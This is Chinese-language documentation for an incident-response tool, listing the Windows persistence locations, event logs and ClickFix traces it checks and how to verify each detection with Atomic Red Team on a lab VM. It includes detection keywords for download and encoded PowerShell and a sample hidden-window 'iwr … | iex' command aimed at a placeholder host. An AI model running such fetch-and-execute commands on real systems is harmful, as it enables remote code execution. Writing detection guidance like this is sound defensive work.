# 偵測覆蓋範圍與驗證方式

`cairn coverage` 會列出這個版本能偵測的 MITRE ATT&CK 技術：內建啟發式（heuristics）一張表，再加上已載入 Sigma 規則的技術標籤統計。**掃描結果乾淨，只代表表上這些技術沒被看到，不代表主機沒事。**

## 持久化：檢查哪些位置

| 技術 | 名稱 | 檢查位置 | 判斷方式 |
|---|---|---|---|
| T1547.001 | Run Keys / Startup | HKLM/HKCU Run、RunOnce（含 WOW6432Node）、Policies\Explorer\Run、Startup 資料夾、BootExecute | Run／Startup：只看路徑和簽章；Policies Run：有項目就報；BootExecute：非 `autocheck autochk` 就報 |
| T1543.003 | Windows Service | Services 中自動啟動的 ImagePath | 只看路徑和簽章 |
| T1053.005 | Scheduled Task | `System32\Tasks` XML | 只看路徑和簽章，加上腳本內容 |
| T1546.003 | WMI Event Subscription | `root\subscription` binding | 一律報；內嵌腳本含動態執行或網址時升為 High |
| T1546.008 | Accessibility Features | IFEO Debugger 指向 sethc／utilman／osk／magnify／narrator 等 | 一律報 High |
| T1546.012 | IFEO Injection | IFEO Debugger、SilentProcessExit MonitorProcess | 一律報 |
| T1546.002 | Screensaver | HKCU `SCRNSAVE.EXE` | 只看路徑和簽章 |
| T1546.007 | Netsh Helper DLL | HKLM\SOFTWARE\Microsoft\NetSh | 不在預設清單，或不在 Windows 目錄下就報 |
| T1546.009 | AppCert DLLs | Session Manager\AppCertDlls | 有項目就報 |
| T1546.010 | AppInit DLLs | AppInit_DLLs（32/64 位元） | 有項目就報 |
| T1546.013 | PowerShell Profile | 所有使用者與目前使用者的 profile.ps1 | 內容含下載或編碼語法（DownloadString、IEX、FromBase64String、-enc、網址）就報 |
| T1546.015 | COM Hijacking | HKCU CLSID\*\InprocServer32 | 只看路徑和簽章 |
| T1546 | cmd AutoRun | Command Processor AutoRun（HKLM/HKCU） | 有項目就報 |
| T1547.002 | Authentication Package | LSA Authentication Packages | 非預設（msv1_0）就報 |
| T1547.003 | Time Providers | W32Time TimeProviders DllName | 不在預設清單，或不在 Windows 目錄下就報 |
| T1547.004 | Winlogon Helper | Winlogon Shell／Userinit／Notify／MPNotify | Shell／Userinit 非預設值就報；MPNotify 有項目就報 |
| T1547.005 | Security Support Provider | LSA Security Packages（含 OSConfig） | 非預設套件就報（例如 mimilib） |
| T1547.010 | Port Monitors | Print\Monitors Driver | 不在預設清單，或不在 Windows 目錄下就報 |
| T1547.014 | Active Setup | Installed Components StubPath | 只看路徑和簽章 |
| T1556.002 | Password Filter DLL | LSA Notification Packages | 非預設（scecli、rassfm）就報 |
| T1137.002 | Office Test | Office test\Special\Perf | 有項目就報 |
| T1037.001 | Logon Script | HKCU\Environment UserInitMprLogonScript | 有項目就報 |

「只看路徑和簽章」是指 persist heuristic 的通用訊號：未簽章且位於使用者可寫入路徑、系統程式名稱出現在 Windows 目錄以外，或是近期修改且簽章無法驗證。

嚴重度規則：有項目或非預設項目一律先算 Medium；目標未簽章、位於使用者可寫入路徑或偽裝成系統程式時升為 High。同一筆有兩個以上訊號，或對應的程式正在執行、留有執行紀錄時，會再升一級。

## 事件記錄：內建偵測（不需要 Sigma 規則）

這些事件 Windows 預設就會寫入，不需要安裝 Sysmon；即使 `rules\sigma` 不在，也會讀取 Security、System 和 Defender Operational 這三個記錄。

| 技術 | 事件 | 判斷方式 |
|---|---|---|
| T1070.001 | Security 1102、System 104（記錄被清除） | 一律報 High |
| T1543.003 | System 7045（新安裝服務） | 指令在使用者可寫入路徑、呼叫 cmd／powershell／mshta 等，或含下載／編碼語法：High；不在 Windows 或 Program Files 下：Medium；其他：Low |
| T1053.005 | Security 4698（新建排程工作，需開啟「其他物件存取」稽核） | 同上，看 TaskContent 裡的 Command 和 Arguments |
| T1562.001 | Defender 5001（即時保護被關閉）、5007（新增排除項目） | 一律報 High |
| — | Defender 1116（偵測到惡意程式） | 依威脅名稱與路徑合併成一筆，報 High |

## 初始入侵：ClickFix（T1204.004）

假驗證碼、假錯誤頁面會要求使用者按 Win+R 貼上指令。Explorer 會把「執行」對話框輸入過的內容存在 `HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`。cairn 會讀所有已登入使用者的這個機碼：呼叫 powershell、mshta、cmd、curl 等並帶參數的報 Medium；同時含下載、編碼、網址或隱藏視窗的報 High。單純的 `cmd`、`notepad`、網路路徑不報。

驗證：在 VM 上按 Win+R 輸入 `powershell -w h -c "iwr http://example.invalid/a.ps1 | iex"`（網址不存在，不會真的下載），再執行 cairn，應該看到一筆 High 的 T1204.004。

## 每位使用者的位置

Run／RunOnce、COM 劫持、登入腳本、螢幕保護程式、cmd AutoRun、RunMRU 會讀 `HKEY_USERS` 底下每個已載入的使用者，不只是執行 cairn 的那個帳號；Startup 資料夾和 PowerShell profile 會檢查 `C:\Users` 下每個使用者。所以資訊人員用自己的管理員帳號提權執行時，也看得到受害使用者的項目（前提是該使用者目前已登入，或其登錄檔已載入）。

## 其他內建偵測

- 行程：Office 或腳本宿主產生 shell（T1059）、編碼或下載型 PowerShell（T1059.001）、LOLBin 帶可疑參數（T1218）、系統程式名稱偽裝（T1036.005）。
- 網路：連線所屬程式未簽章且位於可疑路徑（T1036），若該程式同時有持久化項目會升級。
- 帳號（Security 記錄）：建立帳號（T1136.001）、加入群組（T1098.007）、刪除帳號（T1531）、密碼猜測與噴灑（T1110.001／T1110.003）。
- Sigma：80 條規則，前提是對應的記錄有開啟（Sysmon、4688 含命令列、PowerShell 4104）。實際各技術的規則數請看 `cairn coverage`。

## 怎麼驗證（在實驗用 VM 上，不要在客戶主機上）

1. 準備一台已建立快照的 Windows 10/11 VM，安裝 [Atomic Red Team](https://github.com/redcanaryco/invoke-atomicredteam)。
2. 對要驗證的技術列出測試內容：`Invoke-AtomicTest T1547.005 -ShowDetailsBrief`，先看懂這個測試會改什麼。
3. 執行測試：`Invoke-AtomicTest T1547.005 -TestNumbers 1`。
4. 以管理員身分執行 `cairn run --target live --output C:\IR\t1547005`，確認 `findings.jsonl` 有一筆 `mitre` 含 `T1547.005` 的 finding，`reason` 也說明了原因。
5. 清除測試：`Invoke-AtomicTest T1547.005 -TestNumbers 1 -Cleanup`，或直接還原快照。

建議每次發版前，至少對上表每個技術各跑一個 Atomic 測試，並把「技術、測試編號、是否命中」記錄下來。這就是這個工具可以被驗證的方式：每一列都要能在 VM 上重現。

單元測試則用假的 registry（`cairn-collectors::asep` 的 `RegRead`）驗證每個位置的讀取邏輯，用 `cairn-heur::asep` 的測試驗證預設清單與嚴重度。這兩層都不需要 Windows 就能跑。
